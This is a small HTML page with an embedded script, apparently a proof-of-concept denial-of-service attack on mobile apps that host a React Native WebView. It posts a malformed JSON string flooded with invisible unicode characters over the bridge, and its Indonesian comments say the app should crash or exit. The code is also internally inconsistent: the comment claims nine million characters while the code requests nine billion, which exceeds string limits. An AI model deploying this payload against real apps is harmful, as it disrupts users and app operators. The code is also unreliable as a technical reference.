<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
const log = msg => document.getElementById("log").textContent += "\n" + msg;

try {
    if (window.ReactNativeWebView) {
        log("ReactNativeWebView detected. Sending crash payload...");

        // Gabungan: JSON rusak + unicode flood besar
        const hugeFlood = "\u200F".repeat(9_000_000_000); // 9 juta karakter tak terlihat
        const payload = "{" + hugeFlood; // JSON rusak (tidak tertutup)

        // Kirim payload langsung
        window.ReactNativeWebView.postMessage(payload);

        log("Payload sent. App should crash or exit immediately.");
    } else {
        log("ReactNativeWebView not available.");
    }
} catch (e) {
    log("JS Exception: " + e.message);
}
</script>
</body>
</html>
